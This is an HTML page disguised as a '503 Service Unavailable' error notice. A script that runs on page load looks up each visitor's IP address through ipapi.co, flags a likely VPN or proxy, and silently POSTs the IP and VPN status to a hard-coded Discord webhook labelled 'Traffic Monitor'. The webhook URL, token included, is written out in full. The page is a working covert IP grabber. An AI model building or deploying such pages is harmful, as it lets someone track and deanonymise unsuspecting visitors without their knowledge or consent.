<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Service Unavailable</title>
  <style>
    body {
      background-color: #f8d7da;
      font-family: Arial, sans-serif;
      text-align: center;
      color: #721c24;
      padding: 20px;
    }
    h1 {
      font-size: 2.5em;
      margin-top: 50px;
    }
    p {
      margin-top: 20px;
      font-size: 1.2em;
    }
    .status {
      margin-top: 40px;
      font-size: 1em;
      color: #555;
    }
    .loading {
      font-style: italic;
    }
  </style>
</head>
<body>
  <h1>503 Service Unavailable</h1>
  <p>Our servers are currently overloaded due to high traffic. Please try again later.</p>
  <p class="status" id="status">Checking your connection...</p>
  <script>
    // Webhook URL for Discord
    var webhookUrl = "https://discord.com/api/webhooks/1319029040631517234/uQW3SU6PfNDr6MTW5WqpDgrjq5e7O0FBSYEbSHokGBr1yXIDfE3R6AhqEJi4UfMhwk3e";

    // Free IP API (replace with a more robust VPN detection API for better accuracy)
    var ipApiUrl = "https://ipapi.co/json/";

    // Detect IP and VPN/Proxy
    fetch(ipApiUrl)
      .then(function(response) {
        if (!response.ok) {
          throw new Error("Failed to fetch IP details.");
        }
        return response.json();
      })
      .then(function(data) {
        var ip = data.ip;
        var isVpn = data.org && (data.org.toLowerCase().includes("vpn") || data.org.toLowerCase().includes("proxy"));

        // Update status on the page
        var statusMessage = "Your IP: " + ip + " - ";
        if (isVpn) {
          statusMessage += "VPN/Proxy Detected.";
        } else {
          statusMessage += "Connection looks normal.";
        }
        document.getElementById("status").textContent = statusMessage;

        // Send details to Discord webhook
        var webhookData = {
          content: "IP: " + ip + " | VPN/Proxy: " + (isVpn ? "Yes" : "No"),
          username: "Traffic Monitor",
          avatar_url: "https://example.com/avatar.png"
        };

        fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(webhookData)
        }).then(function(res) {
          console.log("Webhook sent successfully.");
        }).catch(function(err) {
          console.error("Webhook error:", err);
        });
      })
      .catch(function(error) {
        document.getElementById("status").textContent = "Error checking your connection.";
        console.error("Error fetching IP data:", error);
      });
  </script>
</body>
</html>
